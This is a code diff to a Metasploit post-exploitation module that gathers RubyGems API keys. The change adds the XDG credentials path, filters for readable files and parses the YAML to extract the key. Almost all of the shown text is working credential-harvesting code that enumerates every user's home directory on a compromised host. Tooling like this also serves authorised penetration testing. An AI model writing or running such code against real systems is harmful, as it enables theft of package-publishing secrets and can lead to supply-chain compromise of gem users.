@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'yaml'
+
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
@@ -13,7 +15,8 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Multi Gather RubyGems API Key',
         'Description' => %q{
-          This module obtains a user's RubyGems API key from ~/.gem/credentials.
+          This module obtains a user's RubyGems API key from ~/.gem/credentials
+          or the default XDG path ~/.local/share/gem/credentials.
         },
         'Author' => [
           'Jonathan Claudius <jclaudius[at]trustwave.com>',
@@ -32,28 +35,34 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status('Finding ~/.gem/credentials')
-    paths = enum_user_directories.map { |d| d + '/.gem/credentials' }
-    paths = paths.select { |f| file?(f) }
+    print_status('Finding RubyGems credential files')
+    paths = enum_user_directories.flat_map { |dir| ["#{dir}/.gem/credentials", "#{dir}/.local/share/gem/credentials"] }
+    paths = paths.select { |path| file?(path) && readable?(path) }
 
     if paths.empty?
-      print_error('No users found with a ~/.gem/credentials file')
+      print_error('No users found with a readable RubyGems credentials file')
       return
     end
 
     download_key(paths)
   end
 
-  # Ruby gem credentials are pretty standard and can come
-  # in a few flavors, but the most common are straight yaml
-  # and json, both of which are colon delimited. I suppose
-  # you could concievably have more than one, but that'd be
-  # manually editing, and the first one is probably the best
-  # one anyway.
   def extract_key(path)
     data = read_file(path)
-    keys = data.split(':').select { |k| k =~ /[0-9a-f]{32}/ }
-    keys.map(&:strip).first
+    return if data.nil? || data.empty?
+
+    # RubyGems writes YAML with symbol keys and can include named host keys.
+    credentials = YAML.safe_load(data, permitted_classes: [Symbol])
+    return unless credentials.is_a?(Hash)
+
+    key = credentials[:rubygems_api_key] || credentials['rubygems_api_key']
+    return key if key.is_a?(String) && !key.empty?
+
+    credentials.values.find { |value| value.is_a?(String) && !value.empty? }
+  rescue Psych::Exception => e
+    vprint_error("Cannot parse RubyGems credentials #{path}: #{e.message}")
+    elog("Cannot parse RubyGems credentials #{path}", error: e)
+    nil
   end
 
   def download_key(paths)
